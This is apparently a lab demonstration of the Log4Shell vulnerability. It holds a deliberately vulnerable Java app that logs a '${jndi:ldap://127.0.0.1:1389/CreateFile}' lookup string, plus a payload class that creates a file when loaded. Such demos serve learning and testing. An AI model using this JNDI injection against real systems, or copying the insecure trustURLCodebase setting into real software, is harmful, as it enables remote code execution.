# Basic JAR Application

### Vuln App

```
package com.log4jshell;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class App {
    private static final Logger logger = LogManager.getLogger(App.class);
    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:1389/CreateFile}");
    }
}
```

## CreateFile Payload

```
import java.io.File;  // Import the File class
import java.io.IOException;  // Import the IOException class to handle errors

public class CreateFile {
    public CreateFile() {}
    static {
      try {
        File myObj = new File("filename.txt");
        if (myObj.createNewFile()) {
          System.out.println("File created: " + myObj.getName());
        } else {
          System.out.println("File already exists.");
        }
      } catch (IOException e) {
        System.out.println("An error occurred.");
        e.printStackTrace();
      }
    }
    public static void main(String[] args) {
        CreateFile e = new CreateFile();
    }
}
```